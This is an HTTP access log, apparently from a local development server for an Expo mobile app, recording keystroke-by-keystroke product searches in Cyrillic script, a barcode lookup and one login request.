::1 - - [06/Jun/2022:21:04:35 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:04:43 +0000] "GET /api/v1/goods/user?barCode=8656170005691 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:04:47 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:05:11 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:05:12 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:05:30 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:08:33 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:08:35 +0000] "GET /api/v1/goods/user?name=%D0%A0 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:08:37 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:08:38 +0000] "GET /api/v1/goods/user?name=%D3%A8 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:08:39 +0000] "GET /api/v1/goods/user?name=%D3%A8%D1%82 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:08:40 +0000] "GET /api/v1/goods/user?name=%D3%A8 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:08:40 +0000] "GET /api/v1/goods/user?name=%D3%A8%D0%B0 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:08:47 +0000] "GET /api/v1/goods/user?name=%D3%A8%D0%B0 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:08:48 +0000] "GET /api/v1/goods/user?name=%D3%A8 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:08:48 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:08:49 +0000] "GET /api/v1/goods/user?name=%D0%A0 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:08:49 +0000] "GET /api/v1/goods/user?name=%D0%A0%D1%8C HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:04 +0000] "GET /api/v1/goods/user?name=%D0%A0%D1%8C HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:06 +0000] "GET /api/v1/goods/user?name=%D0%A0 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:07 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:07 +0000] "GET /api/v1/goods/user?name=%D0%AC HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:07 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:09 +0000] "GET /api/v1/goods/user?name=%D0%94 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:09 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC%D1%88 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC%D1%88%D0%B8 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:10 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC%D1%88%D0%B8%D2%AF HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:11 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC%D1%88%D0%B8 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:11 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC%D1%88 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:09:11 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88%D0%BC HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:09:11 +0000] "GET /api/v1/goods/user?name=%D0%94%D0%BB%D1%88%D0%BC%D0%B2%D1%88 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
